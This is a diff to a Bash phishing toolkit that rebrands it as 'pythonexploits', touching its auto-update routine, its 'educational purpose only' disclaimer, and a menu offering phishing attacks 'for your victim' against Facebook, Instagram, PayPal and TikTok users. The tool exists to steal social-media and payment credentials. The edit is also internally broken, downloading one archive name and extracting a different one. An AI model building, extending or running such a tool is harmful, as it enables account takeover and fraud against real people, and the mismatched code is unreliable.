@@ -76,9 +76,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/PYTHON/phishing/releases/latest'
+	relase_url='https://api.github.com/repos/pythonexploits/pythonophish/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/PYTHON/phishing/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/pythonexploits/pythonophish/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -86,15 +86,15 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".phishing.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".pythonophish.tar.gz" "${tarball_url}"
 
-		if [[ -e ".phishing.tar.gz" ]]; then
-			tar -xf .phishing.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".pythonophish.tar.gz" ]]; then
+			tar -xf .pythonexploits.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .phishing.tar.gz
+			rm -f .pythonexploits.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run phishing again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run pythonexploits again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
@@ -272,7 +272,7 @@ about() {
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} and this PHISHING TOOL is dangerous to all social media user's, Author will not be responsible to
+		  only ${RED}!${WHITE}${CYAN} and this pythonexploits TOOL is dangerous to all social media user's, Author will not be responsible to
 		  any misuse of this tool in a wrong way ${RED}!${WHITE}
 		
 		${ORANGE} ${BLACKBG}Special Coded by myself :${RESETBG}
@@ -620,7 +620,7 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Phishing Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An pythonexploits Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${CYAN} Facebook      ${RED}[${WHITE}04${RED}]${CYAN} Paypal
 		${RED}[${WHITE}02${RED}]${CYAN} Instagram     ${RED}[${WHITE}05${RED}]${CYAN} Tiktok
